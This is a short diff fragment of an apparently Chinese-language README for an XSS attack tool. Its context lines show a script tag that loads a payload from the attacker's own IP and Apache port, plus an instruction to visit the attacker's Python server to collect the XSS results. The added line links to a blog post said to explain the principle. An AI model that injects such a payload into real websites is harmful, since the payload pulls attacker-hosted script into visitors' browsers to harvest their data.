@@ -5,3 +5,4 @@
 <script src="http://{你的ip地址}:{你的apache端口，一般为80可以不填写}/N"></script>
 ```
 然后直接访问你的python服务器即可获取XSS攻击结果。
+原理可以在这看到：https://www.cnblogs.com/9man/p/18292753
